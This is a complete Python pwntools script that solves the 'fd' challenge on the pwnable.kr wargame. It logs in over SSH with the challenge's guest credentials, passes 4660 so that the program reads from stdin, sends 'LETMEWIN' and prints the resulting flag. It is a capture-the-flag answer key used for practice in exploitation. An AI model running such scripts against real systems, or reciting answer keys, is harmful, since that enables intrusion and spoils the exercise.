from pwn import *

ssh = ssh(user = 'fd', host = 'pwnable.kr', password = 'guest', port = 2222)
process=ssh.process(executable = './fd', argv = ['fd','4660'])
process.sendline(b"LETMEWIN")

result = process.recvline()
print(result)

process.interactive()

